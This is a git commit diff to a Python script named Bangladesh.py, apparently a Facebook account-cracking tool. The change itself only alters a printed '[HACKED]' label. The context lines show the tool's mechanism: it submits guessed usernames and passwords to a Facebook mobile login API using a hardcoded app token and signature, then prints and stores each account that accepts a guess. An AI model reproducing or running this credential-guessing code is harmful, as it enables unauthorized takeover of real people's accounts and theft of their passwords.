379008e423db04948503b9b2575a5dd991ed6b48
ArbabMemon <64311080+ArbabMemon@users.noreply.github.com>
2020-04-28 19:46:42 +0500

    Update Bangladesh.py

--- Bangladesh.py
+++ Bangladesh.py
@@ -339,7 +339,7 @@ def pilih_super():
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if 'access_token' in q:
-				print '\x1b[1;92m[HACKED] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass1 + ' 🦇 ' + b['name']
+				print '\x1b[1;92m[HACKED√] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass1 + ' 🦇 ' + b['name']
 				oks.append(user+pass1)
 			else:
 				if 'www.facebook.com' in q["error_msg"]:
